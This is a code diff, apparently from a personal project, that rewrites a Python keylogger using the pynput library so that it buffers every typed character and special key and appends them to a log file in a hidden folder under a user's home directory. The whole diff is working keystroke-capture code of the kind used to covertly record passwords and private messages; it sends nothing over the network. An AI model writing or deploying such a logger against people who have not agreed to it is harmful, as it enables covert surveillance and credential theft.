@@ -1,15 +1,40 @@
+import logging
 from pynput import keyboard
-from logger_setup import keystroke_logger
+
+log_file_path = '/Users/mannatvirk/.hiddenfolder/keylog.txt'
+keystroke_logger = logging.getLogger('keystroke_logger')
+keystroke_logger.setLevel(logging.INFO)
+
+# preventing duplicates 
+if not keystroke_logger.handlers:
+    handler = logging.FileHandler(log_file_path, mode='a')
+    formatter = logging.Formatter('%(message)s')
+    handler.setFormatter(formatter)
+    keystroke_logger.addHandler(handler)
+
+buffer = []
+
+def flush_buffer():
+    if buffer:
+        keystroke_logger.info(''.join(buffer), extra={'no_newline': True})
+        buffer.clear()
 
 def on_press(key):
+    global buffer
     try:
-        keystroke_logger.info(key.char, extra={"end": ""})
-    except AttributeError:
-        if key == keyboard.Key.space:
-            keystroke_logger.info(" ", extra={"end": ""})
-        elif key == keyboard.Key.enter:
-            keystroke_logger.info("   ", extra={"end": ""})
-        elif key == keyboard.Key.shift:
-            keystroke_logger.info("[shift] ", extra={"end": ""})
+        if hasattr(key, 'char') and key.char is not None:
+            buffer.append(key.char)
         else:
-            keystroke_logger.info(f"[{key.name}] ", extra={"end": ""})
+            flush_buffer()
+            keystroke_logger.info(f'[{key.name}]', extra={'no_newline': True})
+
+        if key == keyboard.Key.space:
+            buffer.append(' ')
+            flush_buffer()
+        elif key == keyboard.Key.enter:
+            buffer.append('\n')
+            flush_buffer()
+
+    except AttributeError:
+        flush_buffer()
+        keystroke_logger.info(f'[{key.name}]', extra={'no_newline': True})
